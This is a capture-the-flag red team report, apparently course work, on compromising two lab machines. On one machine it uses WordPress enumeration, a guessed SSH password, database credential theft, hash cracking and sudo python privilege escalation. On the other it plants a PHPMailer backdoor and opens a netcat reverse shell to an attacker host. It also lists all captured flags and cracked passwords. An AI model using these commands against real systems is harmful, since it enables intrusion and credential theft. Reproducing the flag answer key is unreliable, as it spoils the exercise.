# Red Team: Summary of Operations

## ![](RackMultipart20210406-4-9gsiq3_html_66b4911f5fb52ec6.gif)Table of Contents

- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

$ nmap -sC -sV 192.168.1.110

![](RackMultipart20210406-4-9gsiq3_html_4f997d04ee3744f2.jpg)

$ nmap -sV 192.168.1.115

![](RackMultipart20210406-4-9gsiq3_html_ac65c22cf1b50204.jpg)

This scan identifies the services below as potential points of entry:

**Target 1**

1. Open TCP Port 22
2. Open TCP Port 80
3. Open TCP Port 111
4. Open TCP Port 139
5. Open TCP Port 445

**Target 2**

1. Open TCP Port 22
2. Open TCP Port 80
3. Open TCP Port 111
4. Open TCP Port 139
5. Open TCP Port 445

###


###


### Critical Vulnerabilities

The following vulnerabilities were identified on each target and used for the CTF:

**Target 1**

| Vulnerability | Description | Impact |
| --- | --- | --- |
| Wordpress Enumeration | Enumerated user information on the Wordpress server using wpscan | Access to Confidential information |
| Bruteforce attack &amp; Weak Password | Possible to guess weak passwords or do a dictionary attack | Access to user account.Impacts confidentiality. |
| Directory Traversal | Configuration files and other important files were accessible on SQL database including password hashes | Credentials were obtained. |
| Overbroad sudo permissions | User sudo listing revealed root access to python | With privilege escalation to highest privileges: Now the attacker owns the system. |

**Target 2**

| Vulnerability | Description | Impact |
| --- | --- | --- |
| Improperly Configured web server security | Sensitive data is exposed on the website. | Access to Confidential information |
| PHPMailer CVE 2016-10033 | Possible to execute a malicious script remotely on the target machine | Reverse shell, command and control of the system |
| MySQL UDF | MySQL User Defined Functions Can be exploited to escalate privileges | With privilege escalation to highest privileges: Now the attacker owns the system. |

**Vulnerabilities identified by nmap scan:**![](RackMultipart20210406-4-9gsiq3_html_82f675b3283869a3.png)

| Sl. No | Vulnerability | CVE number | Score | Description |
| --- | --- | --- | --- | --- |
| 1. | TCP Port 22 ssh | CVE-2016-0777 | 5.0 | The resend\_bytes function in roaming\_common.c in the client in OpenSSH 5.x, 6.x, and 7.x before 7.1p2 allows remote servers to obtain sensitive information from process memory |
| CVE-2017-15906 | 5.0 | The process\_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in read only mode, which allows attackers to create zero-length files. |
| CVE-2018-15919 | 4.0 | Remote observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect the existence of users on a target system when GSS2 is in use. |
| 2. | TCP Port 80 HTTP | CVE-2017-3167 | 7.5 | In Apache httpd 2.2.x before 2.2.33 and 2.4.x before 2.4.26, use of the ap\_get\_basic\_auth\_pw() by third-party modules outside of the authentication phase may lead to authentication requirements being bypassed. |
| CVE-2017-7679 | 7.5 | In Apache httpd 2.2.x before 2.2.33 and 2.4.x before 2.4.26, mod\_mime can read one byte past the end of a buffer when sending a malicious Content-Type response header. |
| CVE-2018-1312 | 6.8 | In Apache httpd 2.2.0 to 2.4.29, when generating an HTTP Digest authentication challenge, the nonce sent to prevent reply attacks was not correctly generated using a pseudo-random seed. In a cluster of servers using a common Digest authentication configuration, HTTP requests could be replayed across servers by an attacker without detection. |
| 3. | TCP Port 111 rpc | CVE-2017-8779 | 7.8 | rpcbind through 0.2.4, LIBTIRPC through 1.0.1 and 1.0.2-rc through 1.0.2-rc3, and NTIRPC through 1.4.3 do not consider the maximum RPC data size during memory allocation for XDR strings, which allows remote attackers to cause a denial of service (memory consumption with no subsequent free) via a crafted UDP packet to port 111, aka rpcbomb |
| 4.
 | Open TCP Ports 139 and 445 | CVE-2017-7494 | 10.0 | Samba since version 3.5.0 and before 4.6.4, 4.5.10 and 4.4.14 is vulnerable to remote code execution vulnerability, allowing a malicious client to upload a shared library to a writable share, and then cause the server to load and execute it. |
| CVE-2017-14746 | 7.5 | Use-after-free vulnerability in Samba 4.x before 4.7.3 allows remote attackers to execute arbitrary code via a crafted SMB1 request. |
| CVE-2019-10197 | 6.4 | A flaw was found in samba versions 4.9.x up to 4.9.13, samba 4.10.x up to 4.10.8 and samba 4.11.x up to 4.11.0rc3, when certain parameters were set in the samba configuration file. An unauthenticated attacker could use this flaw to escape the shared directory and access the contents of directories outside the share. |

**Vulnerability scan results as proof of the identified vulnerabilities: Target 1**![](RackMultipart20210406-4-9gsiq3_html_db07dd40fb7928fc.jpg) ![](RackMultipart20210406-4-9gsiq3_html_902ffc2d7bc7bef5.jpg)

![](RackMultipart20210406-4-9gsiq3_html_54066cc25532f8aa.jpg)

**Vulnerability scan results as proof of the identified vulnerabilities: Target 2**![](RackMultipart20210406-4-9gsiq3_html_c0ee4aa4611d6f23.jpg) ![](RackMultipart20210406-4-9gsiq3_html_4dd15c35cd279cd.jpg) ![](RackMultipart20210406-4-9gsiq3_html_6a861d12ae1036d7.jpg)

Exploitation

The Red Team was able to penetrate both Target 1 and Target 2 and retrieve the following confidential data:

**Target 1**

### flag1.txt: flag1{b9bbcb33e11b80be759c4e844862482d}

![](RackMultipart20210406-4-9gsiq3_html_377de6223e9d70ff.jpg)

- Exploit Used: Nmap, wpscan and firefox

- Steps and Commands:
  - Nmap: nmap -sC -sV 192.168.1.110

-sC scans withdefault NSE scripts, safe discovery

-sV attempts to determine version of services running on ports (screen shots input in scanning exposed services portion on page 1)

![](RackMultipart20210406-4-9gsiq3_html_4f997d04ee3744f2.jpg)

  - wpscan –url http://192.168.1.110/wordpress –wp-content-dir -ep -et -eu

![](RackMultipart20210406-4-9gsiq3_html_f0e84d2f16ef1ee2.jpg)

The wp scan identified users on the system- michael and steven

![](RackMultipart20210406-4-9gsiq3_html_ede9bd8116b396a.jpg)

  - Used Inspect option on firefox browser on each pages of website along with search HTML to reveal flag 1

![](RackMultipart20210406-4-9gsiq3_html_a017cca7fc3646af.jpg)

### flag2.txt: flag2{fc3fd58dcdad9ab23faca6e9a36e581c}

![](RackMultipart20210406-4-9gsiq3_html_2c02d28d7477cc30.png)

- Exploit Used: Password Guessing attacks
- Steps and Commands:
  - Guessed the password for michael trying admin, password, and username; the password turned out as michael and Ssh into the target machine ssh michael@192.168.1.110with password as michael.

![](RackMultipart20210406-4-9gsiq3_html_1abbeae38345a01c.jpg)

  - Tried sudo listing with command sudo -l, no sudo options for user michael

![](RackMultipart20210406-4-9gsiq3_html_ba07240a7fac930.jpg)

  - Used a wild card for flag search find /\* -name flag\*.txtgave the location of flag 2 which was confirmed as shown below.

![](RackMultipart20210406-4-9gsiq3_html_685beff0c7f94060.jpg)

![](RackMultipart20210406-4-9gsiq3_html_2c02d28d7477cc30.png)

### flag3.txt: flag3{afc01ab56b50591e7dccf93122770cd2}

- Exploit Used: Directory Browsing
- Steps and Commands:
  - Since wordpress is installed Located wp-config.php file.

![](RackMultipart20210406-4-9gsiq3_html_4cf76ac546fc3139.jpg)

  - More credentials were exposed on reading the wp-config.php file

![](RackMultipart20210406-4-9gsiq3_html_998041f8e2f53652.jpg)

  - Accessed database using above credentials. Using command: mysql -u root –p which prompted for password which is discovered on steb befor as &#39;R@v3nSecutity&#39;

![](RackMultipart20210406-4-9gsiq3_html_6c735486176179c2.jpg)

  - Listed available database, command: show databases;

![](RackMultipart20210406-4-9gsiq3_html_6c735486176179c2.jpg)

  - use wordpress;command was used to get into word press database
  - show tables; command for listing the database tables

![](RackMultipart20210406-4-9gsiq3_html_db8c059467eaf61e.jpg)

  - Dumped password hashes of michael and steven. Command: select \* from wp\_users;

![](RackMultipart20210406-4-9gsiq3_html_a5abde806356a96d.jpg)

  - Reading the posts table gave the flag 3. Command: select \* from wp\_posts;
  -

![](RackMultipart20210406-4-9gsiq3_html_64b1eec8768eac91.png)

![](RackMultipart20210406-4-9gsiq3_html_cd6346c7c4ba491.png)

### flag4.txt:flag4{715dea6c055b9fe3337544932f2941ce}

![](RackMultipart20210406-4-9gsiq3_html_49b51dfa3b5fab95.jpg)

- Exploit Used: Interactive Terminal Spawned via Python, Sudo listing, John for Cracking password hashes
- Steps &amp; Commands:
  - The password hashes were saved into a file hashes.txt and using John the ripper the password hashes for steven was cracked. Command: john hashes.txt

![](RackMultipart20210406-4-9gsiq3_html_a5abde806356a96d.jpg)

![](RackMultipart20210406-4-9gsiq3_html_900e024210dd769c.jpg)

  - Logged in using stevens password pink84 and escalated privileges using python command sudo python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39; since the Sudo listing command sudo -l showed the user has root access for python.

![](RackMultipart20210406-4-9gsiq3_html_33b4b9c261d26f3c.png)

  - Flag 4 was obtained from the root directory

![](RackMultipart20210406-4-9gsiq3_html_a4241058057e9628.png)

![](RackMultipart20210406-4-9gsiq3_html_49b51dfa3b5fab95.jpg)

**Target 2**

flag1.txt:flag1{ a2c1f66d2b8051bd3a5874b5b6e43e21}

![](RackMultipart20210406-4-9gsiq3_html_b5929a7250f39ee5.png)

- Exploit Used: Information Disclosure by browsing with firefox, dirbuster.
- Command &amp; Steps Used:
  - DirBuster was used to list the directories

![](RackMultipart20210406-4-9gsiq3_html_e989b19cb838a82d.png)

  - Browsed through listed directories in firefox to obtain the flag1.

![](RackMultipart20210406-4-9gsiq3_html_b5929a7250f39ee5.png)

flag2.txt: flag2{6a8ed560f0b5358ecf844108048eb337}

![](RackMultipart20210406-4-9gsiq3_html_a6252d3866f3fe68.jpg)

. ![](RackMultipart20210406-4-9gsiq3_html_a2bded0a762c03be.png)

- Exploit Used:Web application abuses phpmailer &amp; Netcat, dirbuster was used to expose directory path.
- Steps and Commands
  - We Used a shell script which will upload a php file that can be executed by commend injection.It uploaded a file called backdoor.php to the target server; no validation errors. Command:

nano exploit.sh to edit script for preferred ip address

chmod +x exploit.sh for execute permission on script

./exploit.sh to run the script

![](RackMultipart20210406-4-9gsiq3_html_4f312572b5225da3.jpg)

![](RackMultipart20210406-4-9gsiq3_html_d0d8aba853be8ead.jpg)

We got a status that the system is ready to accept shell commands.

  - The listener was set up on Kali, the attacker machine using netcat on port 4444 just before running the script. Command: nc -lnvp 4444

![](RackMultipart20210406-4-9gsiq3_html_b66623cc90c0b4b2.png)

  - Did the command injection through firefox browser, so that a backdoor access was obtained to www-data ie; the webserver Target 2.

Command: http://192.168.1.115/backdoor.php?cmd=nc%20192.168.1.90%204444%20-e%20/bin/bash

![](RackMultipart20210406-4-9gsiq3_html_849a35708662f212.jpg)

  - Obtained flag 2 from /var/www and copied flag 2.

![](RackMultipart20210406-4-9gsiq3_html_a2bded0a762c03be.png)

flag3.txt: flag3{a0f568aa9de277887f377887f37730d71520d9b}

![](RackMultipart20210406-4-9gsiq3_html_637661e5edb3b796.jpg)

- Exploit Used: Directory Browsing
  - Wildcard search command: find /var/www -type f -iname &#39;flag\*&#39; located the flag 3.
  - Discovered the flag 3 in the below folder. As it is a png file the path was pasted to the browser command to view the flag.

![](RackMultipart20210406-4-9gsiq3_html_d8e221ad9934636c.png)

| **Target 1** |
| --- |
| flag1 | flag1{b9bbcb33e11b80be759c4e844862482d} |
| flag2 | flag2{fc3fd58dcdad9ab23faca6e9a36e581c} |
| flag3 | flag3{afc01ab56b50591e7dccf93122770cd2} |
| flag4 | flag4{715dea6c055b9fe3337544932f2941ce} |
| **Target 2** |
| flag1 | flag1{ a2c1f66d2b8051bd3a5874b5b6e43e21} |
| flag2 | flag2{6a8ed560f0b5358ecf844108048eb337} |
| flag3 | flag3{a0f568aa9de277887f377887f37730d71520d9b} |

Page 13 of 13